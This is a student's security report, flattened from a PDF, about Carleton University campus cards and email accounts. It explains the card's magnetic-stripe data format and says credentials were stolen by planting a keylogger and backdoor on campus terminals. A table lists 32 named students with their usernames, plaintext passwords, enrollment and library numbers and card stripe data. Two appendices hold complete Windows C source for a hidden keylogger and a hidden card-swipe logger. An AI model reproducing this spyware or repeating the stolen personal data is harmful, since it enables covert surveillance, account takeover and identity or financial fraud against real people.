appeal for carleton cypherpunk posse by kasper holmberg abstract this report exposes the poor state of information security ﬀecting students at carleton university and speciﬁcally provides examples of largescale identity theft kasperholmberggmailcom 1table of contents list of ﬁgures 2 list of tables 2 introduction 3 organization 3 1 background 4 11 campus card 4 111 outline of magnetic stripe 4 112 magnetic stripe data composition 4 113 library account number 5 12 connect account communications 5 121 registrar communications 5 122 library notiﬁcations 5 2 method 6 3 results 6 4 proposed remediation 7 5 conclusions 7 6 appendix 1 lulac 8 7 appendix 2 sakurac 14 list of ﬁgures illustration of the magnetic stripe on campus cards scale 12 4 composition of track 2 data on campus cards 4 composition of student account information found in the ﬁrs t ﬁeld of track 2 of the campus card 5 composition of additional data found in the second ﬁeld of tr ack 2 of the campus card 5 an example of library account data encoded as it would be on c ampus card 5 list of tables sample of 32 cases of total identity compromise 6 brief summary of success rates of results obtained 72 sectionintroduction this report is written by fulltime student of carleton uni versity currently enrolled as an undergrad uate in the department of mathematics and statistics the au thor hereby wishes to elicit response from the reader and the community leading to greater awareness of the issues of privacy and security or lack thereof aﬀecting students organization some technical and nontechnical information relating to t he carleton university campus card and nect email system and their relevance is ﬁrst provided fol lowed by brief explanation of the attack used to obtain private identity information and ﬁnally some exa mple results are presented followed by brief conclusionorganization 31 background students identity at carleton university is established with student enrollment number andor campus card which also serves for ﬁnancial transactions across campus furthermore oﬃcial email com munication with the university occurs via students unive rsityprovided email account identity information is interconnected in such way that t otal compromise of students identity becomes possible by employing weakestlink method the fa ct the campus card was designed for dual purposes makes it weak link vulnerable to information leak age campus card contains three key unique identiﬁers the magn etic stripe barcode and student enrollment numberthe latter two readily leaked from anoth er source connect 11 campus card for as long as you are student here your new carleton campu s card will be the single most important piece of student identiﬁcation you possess campus card program 111 outline of magnetic stripe figure 1 illustration of the magnetic stripe on campus cards scale 12 standard magnetic stripe is located on the back face of camp us cards only the second track of the magnetic stripe is used data ss index 0102030405060708091011121314151617181920 fs 2122232425262728293031323334353637383940 figure 2 composition of track 2 data on campus cards legend ss start sentinel 0x0b fs ﬁeld separator 0x0d end sentinel 0x0f longitudinal redundancy check lrc data on track 2 begins with start sentinel and is divided int two ﬁelds delimited by ﬁeld separator the track ends with an end sentinel and single parity check digit 112 magnetic stripe data composition data found on the second track of the magnetic stripe is used f or ﬁnancial transactions and organized according to the format speciﬁed in iso 7813 in the ﬁrst ﬁeld between the start sentinel and ﬁeld separat or is the students 12digit ﬁnancial account number adhering to iso 7812 it is preceded by the iversitys 6digit issuer identiﬁcation number iin and terminated by one checkdigit calculated using the luhn checksum algorithm over the 18 digits of the ﬁeld4 section 1data 600807 index 02030405060708091011121314151617181920 figure 3 composition of student account information found in the ﬁrs t ﬁeld of track 2 of the campus card legend luhn check digit in the case of carleton university the issuer identiﬁcatio n number is 6008071 which includes the single digit major industry identiﬁer of 6identifying the campus card as card for merchandising an d banking the second ﬁeld between the ﬁeld separator and the end senti nel contains additional data consisting of 4digit student account expiration date2and service code the expiration date is in the yymm format where yyrepresents the last two digits of year card was issued 4andmmrepresents the two digits calculated with month card was issued mod 12 immediately following this is the 3digit service code1203 the remainder of the ﬁeld is zeroed data 1200000000000 index 2223242526272829303132333435363738 figure 4 composition of additional data found in the second ﬁeld of tr ack 2 of the campus card 113 library account number data encoded in the barcode located on the front face of stu dent cards consists of single account iden tiﬁer used for library operations this 11digit account nu mber is encoded in the code 39 standard figure 5 an example of library account data encoded as it would be on c ampus card 12 connect account communications this email communication including all attachments may contain private proprietary privi leged andor confidential information and subject to copyr ight it is intended only for the person to whom it is addressed any unauthorized use copyin g or distribution of the contents of this email is strictly prohibited noreplyconnectcarletonca the university relays oﬃcial messages and updates to studen ts through their connect email accounts it is the responsibility of the student to keep up to date with these and replies sent from connect account are assumed to have originated from the student and r equire further authentication some of these emails contain identifying and other personal infor mation in plaintext which would allow an attacker to therefore assume victims identity 121 registrar communications the university registrar makes use of students connect acc ounts for oﬃcial communication and may occasionally send emails containing otherwise conﬁdenti reports about the students registration status 122 library notiﬁcations automated messages about overdue loans or ﬁnes are sent peri odically to the students connect account included in plaintext in these emails are the students rollment number and library account number 1 although the author does not have access to the iso register of card issuer identiﬁcation numbers this conclusion is obvious given amount of data which validates it 2 not to be confused with the valid to date printed on the fa ce of the campus card the student account expiration date is linked to the students ﬁnancial account and is not r elated to the validity period of the card itself 3 the function of the service code is to identify the card tra nsactions type 120corresponds to debittype cards whereas credit cards commonly have service code of 100 campus cards are debit cardsbackground 52 method personal and identiﬁcation credentials were obtained by in stalling software keylogger and backdoor on select pos and other service terminals personal information was then obtained by accessing conﬁden tial communications with these credentials 3 results the author was able to compromise students connect account credentials using the methods described in the previous section as well as the complete set of data foun d on campus cards for example it was determined that student lubing wangs connect username was lwang5 and the associated password was w189866 subsample of 32 such cases was randomly selected and is pre sented in the table below in the fol lowing format students name connect account username p assword student enrollment number library account number and campus card magnetic stripe dat for each student the string of data under campus card is the data string encoded on the magneti c stripe note in order to prevent targeted abuse data pertaining to ﬁnanc ial accounts is associated with the incorrect students all data is however valid and correct at the time of writing name connect enrollment data first last username password nolibrary campus card ashley kenny akenny ashley7 100309514 0862098263x 600807599605342265107041200000000000 2chelsea fahey cfahey cf72366 100709923 08620940929 600807595674897198310041200000000000 david brown dbbrown ds1621 100659677 08620694375 600807595428458717210041200000000000 4 daniel crepault dcrepaul gedgac1 100754713 08621027291 600807595717004635109041200000000000 daniel kaunisviita dkaunisv katya20 100617682 0862112369x 600807598618576589510041200000000000 6 erin jennings ejennin2 relish9 100723120 08620942875 600807597689657979210041200000000000 emily truman ejtruman mooney4 100350090 08620950622 600807593737984679310041200000000000 8 emily senger esenger alberta3 100735639 08621051079 600807590885299845009041200000000000 golbon mirzadjani gmirzadj gol1361 100328705 08620804170 600807591490629566109041200000000000 10 garrett zehr gzehr goodman1 100665295 08621110903 600807598834848374709041200000000000 janine delorey jdelore2 schnepf4 100752250 08621044277 600807592580959147709041200000000000 12 jeﬀrey wolfson jwolfson je123456 100408935 08620663364 600807594444853917710041200000000000 kyla pearson kpearson stellar0 100695814 08620803042 600807599884448764709041200000000000 14 laura gibson lgibson3 greece01 100645208 0862071788x 600807592699995291709041200000000000 liam giﬃn lgiffin liam82 100699504 08620843540 600807594282521931410041200000000000 16 megan cheung mcheung3 3memily 100715097 08620913514 600807596209775665209041200000000000 marina hollingbury mhollin2 v7w2j8 100674303 08620773852 600807598071506340008041200000000000 18 mallory procunier mprocuni beatles4 100680243 08620757458 600807594924245509010041200000000000 natalie ekholm nekholm 20arnold 100714867 08620917668 600807595428458717210041200000000000 20 natalie glister nglister natalie1 100693235 08620761285 600807599030094791707041200000000000 nicholas ruest nruest krystal1 100677447 0862077008x 600807596522838435110041200000000000 22 patricia grannum pgrannum toni22 100690540 08620830813 600807595428458717210041200000000000 peiwen shen pshen so8ra 100652918 08620675044 600807595592223432510041200000000000 24 ryan hicks rhicks3 bilbao1 100282325 08621045109 600807591960531233709041200000000000 renee jeﬀrey rjeffre2 rdj137 100623135 08621069598 600807595428458717210041200000000000 26 ruth laurie rlaurie 1tyler 100709737 08620905171 600807595717004635109041200000000000 rosemary quipp rquipp tiger1 100665037 0862067305x 600807598618576589510041200000000000 28 robert randall rrandall robbie82 100294035 0862108709x 600807597689657979210041200000000000 ran yan ryan2 yr113113 100695250 08620844342 600807593737984679310041200000000000 30 sarah middleton smiddlet jane23 100751663 0862105874x 600807590885299845009041200000000000 tanya castle tcastle2 patches1 100604703 08620514539 600807591490629566109041200000000000 32theshlen naidoo tnaidoo dogtown2 100291737 08620966936 600807598834848374709041200000000000 table 1 sample of 32 cases of total identity compromise6 section 3the accuracy of the complete set of results is outlined in the table below information pertaining to identiﬁcation was less readily obtainable than that relati ng to ﬁnancial accounts identitypartial 65 total 35 financialpartial 0 total 100 table 2 brief summary of success rates of results obtained 4 proposed remediation the author simply recommends the discontinuation of use of t he campus card in its present form 5 conclusions in summary the current carleton university information sy stems infrastructure provides inadequate safe guards against information leakage potentially leading t identity or ﬁnancial fraud it has been proven that identity theft and fraud on large scale are possible nd it is likely that this is merely the tip of the icebergconclusions 76 appendix 1 lulac 1 lulac 2 3 for authorized use only 4 use on systems property of carleton university is forbidd 5 6 usage lula log file 7 output format is one input field per line 8 9 this program is free software you can redistribute it and or modify 10 it under the terms of the gnu general public license as pub lished by 11 the free software foundation either version 3 of the lic ense or 12 at your option any later version 13 14 this program is distributed in the hope that it will be use ful 15 but without any warranty without even the implied warra nty of 16 merchantability or fitness for particular purpose the 17 gnu general public license for more details 18 19 you should have received copy of the gnu general public l icense 20 along with this program if not see httpwwwgnuor glicenses 21 22 23 include stdioh 24 include stringh 25 include timeh 26 include errnoh 27 include windowsh 28 include winuserh 29 include windowsxh 30 31 ifndef vk_oem_1 32 define vk_oem_1 0xba 33 endif 34 ifndef vk_oem_plus 35 define vk_oem_plus 0xbb 36 endif 37 ifndef vk_oem_comma 38 define vk_oem_comma 0xbc 39 endif 40 ifndef vk_oem_minus 41 define vk_oem_minus 0xbd 42 endif 43 ifndef vk_oem_period 44 define vk_oem_period 0xbe 45 endif 46 ifndef vk_oem_2 47 define vk_oem_2 0xbf 48 endif 49 ifndef vk_oem_3 50 define vk_oem_3 0xc0 51 endif 52 ifndef vk_oem_48 section 653 define vk_oem_4 0xdb 54 endif 55 ifndef vk_oem_5 56 define vk_oem_5 0xdc 57 endif 58 ifndef vk_oem_6 59 define vk_oem_6 0xdd 60 endif 61 ifndef vk_oem_7 62 define vk_oem_7 0xde 63 endif 64 65 define default_filename lulatxt 66 67 int 68 main argc argv 69 int argc 70 char argv 71 72 hwnd foo 73 int r 74 unsigned short int i 75 unsigned short int shift_flag 0 76 caps_flag 0 77 const unsigned short int keys_n 72 78 79 httpmsdn2microsoftcomenuslibraryms6455 40vs85aspx 80 const int keys 81 0x41 82 0x42 83 0x43 84 0x44 85 0x45 86 0x46 87 0x47 88 0x48 89 0x49 90 0x4a 91 0x4b 92 0x4c 93 0x4d 94 0x4e 95 0x4f 96 0x50 97 0x51 98 0x52 99 0x53 100 0x54 101 0x55 102 0x56 103 0x57 104 0x58 105 0x59 106 0x5a z appendix 1 lulac 9107 0x30 0 108 0x31 109 0x32 110 0x33 111 0x34 112 0x35 113 0x36 114 0x37 115 0x38 116 0x39 9 117 vk_oem_3 118 vk_oem_minus _ 119 vk_oem_plus 120 vk_oem_5 121 vk_oem_4 122 vk_oem_6 123 vk_oem_1 124 vk_oem_7 125 vk_oem_comma 126 vk_oem_period 127 vk_oem_2 128 vk_space 129 vk_numpad0 130 vk_numpad1 131 vk_numpad2 132 vk_numpad3 133 vk_numpad4 134 vk_numpad5 135 vk_numpad6 136 vk_numpad7 137 vk_numpad8 138 vk_numpad9 139 vk_decimal 140 vk_add 141 vk_divide 142 vk_multiply 143 vk_subtract 144 vk_lbutton 145 vk_tab 146 vk_return 147 vk_back 148 vk_delete 149 vk_left 150 vk_right 151 152 vk_shift 153 vk_capital 154 155 0 156 157 const char keys_rtn2 158 159 b b 160 c c 10 section 6161 d d 162 163 f f 164 g g 165 h h 166 i i 167 j j 168 k k 169 l l 170 m m 171 n n 172 173 p p 174 q q 175 r r 176 s s 177 t t 178 u u 179 v v 180 w w 181 x x 182 183 z z 184 0 185 1 186 2 187 3 188 4 189 5 190 6 191 7 192 8 193 9 194 195 _ 196 197 198 199 200 201 202 203 204 205 206 numpad 207 0 0 208 1 1 209 2 2 210 3 3 211 4 4 212 5 5 213 6 6 214 7 7 appendix 1 lulac 11215 8 8 216 9 9 217 218 219 220 221 222 submit 223 n n left mouse button 224 n n tab key 225 n n enter key 226 special 227 backspace key 228 key 229 left arrow key 230 right arrow key 231 232 null null 233 234 char log_filename null 235 file log_file 236 237 if argc 1 238 log_filename strdup default_filename 239 else if argc 2 240 log_filename strdup argv1 241 else 242 exit exit_failure 243 244 if log_filename null 245 exit exit_failure 246 247 allocconsole 248 foo findwindowa consolewindowclass null 249 showwindow foo 0 250 251 for 252 253 sleep1 254 for i 0 i keys_n i 255 256 r getasynckeystate keys i 257 if r 0x1 258 259 if keys i vk_shift 260 shift_flag 1 261 else if keys i vk_capital 262 caps_flag caps_flag 263 else 264 265 log_file fopen log_filename 266 if log_file null 267 exit exit_failure 268 else12 section 6269 270 fputs keys_rtn i 271 shift_flag caps_flag i 26 272 log_file 273 fclose log_file 274 275 if shift_flag 276 shift_flag 0 277 278 279 280 281 282 return exit_success 283 284appendix 1 lulac 137 appendix 2 sakurac 1 sakurac 2 3 for authorized use only 4 use on systems property of carleton university is forbidd 5 6 usage sakura log file 7 output format is one card swipe per line 8 if log file is supplied the program attempts to output 9 to the default ctemp directory 10 11 this program is free software you can redistribute it an dor modify 12 it under the terms of the gnu general public license as pub lished by 13 the free software foundation either version 3 of the lic ense or 14 at your option any later version 15 16 this program is distributed in the hope that it will be use ful 17 but without any warranty without even the implied warra nty of 18 merchantability or fitness for particular purpose the 19 gnu general public license for more details 20 21 you should have received copy of the gnu general public l icense 22 along with this program if not see httpwwwgnuor glicenses 23 24 25 include stdioh 26 include stringh 27 include timeh 28 include errnoh 29 include windowsh 30 include winuserh 31 include windowsxh 32 33 define buffer_len 39 34 define default_filename ctempsakuratxt 35 36 int 37 main argc argv 38 int argc 39 char argv 40 41 hwnd foo 42 int r 43 unsigned short int i n 0 44 const unsigned short int keys_n 12 45 const int keys 0xba 0x30 0x31 0x32 46 0x33 0x34 0x35 0x36 47 0x37 0x38 0x39 0xbf 48 const char keys_rtn 0 1 2 49 3 4 5 6 50 7 8 9 51 char buffer log_filename null 52 file log_file14 section 753 54 if argc 1 55 log_filename strdup default_filename 56 else if argc 2 57 log_filename strdup argv1 58 else 59 exit exit_failure 60 61 if log_filename null 62 exit exit_failure 63 64 allocconsole 65 foo findwindowa consolewindowclass null 66 showwindow foo 0 67 68 buffer malloc sizeof buffer buffer_len 1 69 if buffer null 70 exit exit_failure 71 72 for 73 74 sleep2 75 for i 0 i keys_n i 76 77 r getasynckeystate keys i 78 if r 0x1 79 if keys i keys 0 80 81 n 0 82 buffer n keys_rtn i 83 84 else if n buffer_len 2 85 86 strncpy buffer n 2 sizeof char 87 log_file fopen log_filename 88 if log_file null 89 exit exit_failure 90 else 91 92 fputs buffer log_file 93 fputs n log_file 94 fclose log_file 95 96 n 0 97 98 else if n 0 n buffer_len 1 99 100 buffer n keys_rtn i 101 if n 20 102 buffer n 103 104 else 105 n 0 106 appendix 2 sakurac 15107 108 109 free buffer 110 if argc 2 111 free log_filename 112 exit exit_success 113 11416 section 7